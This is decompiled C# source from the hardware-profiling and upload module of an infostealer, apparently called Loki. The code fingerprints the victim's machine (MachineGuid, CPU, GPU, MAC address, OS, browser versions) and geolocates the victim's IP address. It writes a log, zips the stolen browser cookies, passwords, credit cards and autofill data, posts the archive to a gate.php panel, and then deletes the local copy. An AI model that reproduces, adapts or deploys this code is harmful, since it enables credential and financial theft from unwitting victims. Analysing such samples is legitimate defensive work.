using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using loki.loki.Stealer.Cookies;
using loki.loki.Stealer.Credit_Cards;
using loki.loki.Stealer.Passwords;
using loki.loki.Stealer.WebData;

namespace loki.loki.Utilies.Hardware;

public class Hardware
{
	public static string guid
	{
		get
		{
			try
			{
				using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
				using RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography");
				if (registryKey2 == null)
				{
					throw new KeyNotFoundException(string.Format("Key Not Found: {0}", "SOFTWARE\\Microsoft\\Cryptography"));
				}
				object value = registryKey2.GetValue("MachineGuid");
				if (value == null)
				{
					throw new IndexOutOfRangeException(string.Format("Index Not Found: {0}", "MachineGuid"));
				}
				return value.ToString()!.ToUpper().Replace("-", string.Empty);
			}
			catch
			{
				return "HWID not found";
			}
		}
	}

	private static string OutputResult(string info, List<string> result)
	{
		if (info.Length > 0)
		{
			return info;
		}
		if (result.Count > 0)
		{
			int index = 0;
			if (0 < result.Count)
			{
				return result[index];
			}
		}
		return null;
	}

	private static List<string> GetHardwareInfo(string WIN32_Class, string ClassItemField)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		List<string> list = new List<string>();
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM " + WIN32_Class);
		try
		{
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					list.Add(((ManagementBaseObject)val2).get_Item(ClassItemField).ToString()!.Trim());
				}
				return list;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			return list;
		}
	}

	public static string define_windows()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM CIM_OperatingSystem");
			string text = string.Empty;
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject current = enumerator.get_Current();
					text = current.get_Item("Caption").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (text.Contains("8"))
			{
				return "Windows 8";
			}
			if (text.Contains("8.1"))
			{
				return "Windows 8.1";
			}
			if (text.Contains("10"))
			{
				return "Windows 10";
			}
			if (text.Contains("XP"))
			{
				return "Windows XP";
			}
			if (text.Contains("7"))
			{
				return "Windows 7";
			}
			return text.Contains("Server") ? "Windows Server" : "Unknown";
		}
		catch
		{
			return "Unknown";
		}
	}

	public static void info(string dir)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_0138: Expected O, but got Unknown
		//IL_014a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_0178: Expected O, but got Unknown
		//IL_01b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bc: Expected O, but got Unknown
		//IL_01f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fa: Expected O, but got Unknown
		//IL_0212: Unknown result type (might be due to invalid IL or missing references)
		//IL_0219: Expected O, but got Unknown
		//IL_0243: Unknown result type (might be due to invalid IL or missing references)
		//IL_024a: Expected O, but got Unknown
		//IL_0265: Unknown result type (might be due to invalid IL or missing references)
		object obj = 0;
		new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Product");
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("Select * from Win32_ComputerSystem").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementBaseObject current = enumerator.get_Current();
				obj = current.get_Item("NumberOfLogicalProcessors");
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text = Hardware.guid;
		string text2 = define_windows();
		WebRequest webRequest = WebRequest.Create("http://ip-api.com/line/?fields");
		string value;
		using (WebResponse webResponse = webRequest.GetResponse())
		{
			using StreamReader streamReader = new StreamReader(webResponse.GetResponseStream());
			value = streamReader.ReadToEnd();
		}
		using (StreamWriter streamWriter = new StreamWriter(Path.GetTempPath() + "\\R725K54.tmp"))
		{
			streamWriter.WriteLine(value);
		}
		string[] array = File.ReadAllLines(Path.GetTempPath() + "\\R725K54.tmp", Encoding.Default);
		byte[] array2 = Convert.FromBase64String("aguidthatIgotonthewire==");
		Array.Reverse((Array)array2, 0, 4);
		Array.Reverse((Array)array2, 4, 2);
		Array.Reverse((Array)array2, 6, 2);
		Guid guid = new Guid(array2);
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
		object obj2 = 0;
		ManagementObjectSearcher val2 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_NetworkAdapterConfiguration");
		object obj3 = 0;
		ManagementObjectEnumerator enumerator2 = val2.Get().GetEnumerator();
		try
		{
			while (enumerator2.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator2.get_Current();
				obj3 = ((ManagementBaseObject)val3).get_Item("MACAddress");
			}
		}
		finally
		{
			((IDisposable)enumerator2)?.Dispose();
		}
		ManagementObjectEnumerator enumerator3 = val.Get().GetEnumerator();
		try
		{
			while (enumerator3.MoveNext())
			{
				ManagementObject val4 = (ManagementObject)enumerator3.get_Current();
				obj2 = ((ManagementBaseObject)val4).get_Item("Name");
			}
		}
		finally
		{
			((IDisposable)enumerator3)?.Dispose();
		}
		object obj4 = 0;
		ManagementObjectSearcher val5 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
		ManagementObjectEnumerator enumerator4 = val5.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val6 = (ManagementObject)enumerator4.get_Current();
				obj4 = ((ManagementBaseObject)val6).get_Item("Caption");
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		ManagementObjectSearcher val7 = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemory");
		int num = 1;
		ManagementObjectEnumerator enumerator5 = val7.Get().GetEnumerator();
		try
		{
			while (enumerator5.MoveNext())
			{
				_ = (ManagementObject)enumerator5.get_Current();
				num++;
			}
		}
		finally
		{
			((IDisposable)enumerator5)?.Dispose();
		}
		File.Exists("C:\\Program Files\\Mozilla Firefox\\\\firefox.exe");
		int num2 = 0;
		using (StreamWriter streamWriter2 = new StreamWriter(dir + "\\information.log"))
		{
			streamWriter2.WriteLine(Settings.name + " " + Settings.Stealer_version + " " + Settings.coded);
			streamWriter2.WriteLine(" ");
			streamWriter2.WriteLine("IP : " + array[13]);
			streamWriter2.WriteLine("Country Code : " + array[2]);
			streamWriter2.WriteLine("Country :" + array[1]);
			streamWriter2.WriteLine("State Name : " + array[4]);
			streamWriter2.WriteLine("City :" + array[5]);
			streamWriter2.WriteLine("Timezone :" + array[9]);
			streamWriter2.WriteLine("ZIP : " + array[6]);
			streamWriter2.WriteLine("ISP : " + array[10]);
			streamWriter2.WriteLine("Coordinates :" + array[7] + " , " + array[8]);
			streamWriter2.WriteLine(" ");
			streamWriter2.WriteLine("Username : " + Environment.UserName);
			streamWriter2.WriteLine("PCName : " + Environment.MachineName);
			Guid guid2 = guid;
			streamWriter2.WriteLine("UUID : " + guid2);
			streamWriter2.WriteLine("HWID : " + text);
			streamWriter2.WriteLine("OS : " + text2);
			streamWriter2.WriteLine("CPU : " + obj2);
			streamWriter2.WriteLine("CPU Threads: " + obj);
			streamWriter2.WriteLine("GPU : " + obj4);
			streamWriter2.WriteLine("RAM :" + num + " GB");
			streamWriter2.WriteLine("MAC :" + obj3);
			streamWriter2.WriteLine("Screen Resolution :" + Screen.get_PrimaryScreen().get_Bounds().Width + "x" + Screen.get_PrimaryScreen().get_Bounds().Height);
			streamWriter2.WriteLine("System Language : " + CultureInfo.CurrentUICulture.DisplayName);
			streamWriter2.WriteLine("Layout Language : " + InputLanguage.get_CurrentInputLanguage().get_LayoutName());
			streamWriter2.WriteLine("PC Time : " + DateTime.Now);
			streamWriter2.WriteLine("Browser Versions");
			if (File.Exists("C:\\Program Files\\Mozilla Firefox\\firefox.exe"))
			{
				object value2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
				if (value2 != null)
				{
					num2++;
					streamWriter2.WriteLine("Mozilla Version: " + FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion);
				}
				else
				{
					num2++;
					value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
					streamWriter2.WriteLine("Mozilla Version: " + FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion);
				}
			}
			if (Directory.Exists(Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data"))
			{
				object value3 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
				if (value3 != null)
				{
					num2++;
					streamWriter2.WriteLine("Chrome Version:" + FileVersionInfo.GetVersionInfo(value3.ToString()).FileVersion);
				}
				else
				{
					num2++;
					value3 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
					streamWriter2.WriteLine("Chrome Version:" + FileVersionInfo.GetVersionInfo(value3.ToString()).FileVersion);
				}
			}
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Web Data"))
			{
				string text3 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Classes\\Applications\\opera.exe\\shell\\open\\command", "", null)!.ToString();
				text3 = text3.Remove(text3.Length - 6, 6);
				text3 = text3.Remove(0, 1);
				string fileVersion = FileVersionInfo.GetVersionInfo(text3).FileVersion;
				string text4 = string.Empty;
				if (fileVersion.Split(new char[1] { '.' }).First().Equals("54"))
				{
					text4 = "67.0.3396.87";
				}
				if (fileVersion.Split(new char[1] { '.' }).First().Equals("55"))
				{
					text4 = "68.0.3440.106";
				}
				if (fileVersion.Split(new char[1] { '.' }).First().Equals("56"))
				{
					text4 = "69.0.3497.100";
				}
				if (fileVersion.Split(new char[1] { '.' }).First().Equals("57"))
				{
					text4 = "70.0.3538.102";
				}
				num2++;
				streamWriter2.WriteLine("Opera Version: " + text4);
			}
			if (num2 == 0)
			{
				streamWriter2.WriteLine("Popular Browsers Not Found!");
			}
			streamWriter2.Close();
		}
		ZipFile.CreateFromDirectory(dir, Path.GetTempPath() + "\\" + array[1] + "_" + array[13] + "_" + text + ".zip");
		try
		{
			new WebClient().UploadFile(Settings.Url + $"gate.php?id={1}&os={text2}&cookie={GetCookies.CCookies}&pswd={GetPasswords.Cpassword}&version={Settings.Stealer_version}&cc={Get_Credit_Cards.CCCouunt}&autofill={Get_Browser_Autofill.AutofillCount}&hwid={text}", "POST", Path.GetTempPath() + "\\" + array[1] + "_" + array[13] + "_" + text + ".zip");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
		File.Delete(Path.GetTempPath() + "\\" + array[1] + "_" + array[13] + "_" + text + ".zip");
	}

	private static long GetSizeInMegabytes(long bytes)
	{
		return bytes / 1024L / 1024L;
	}
}
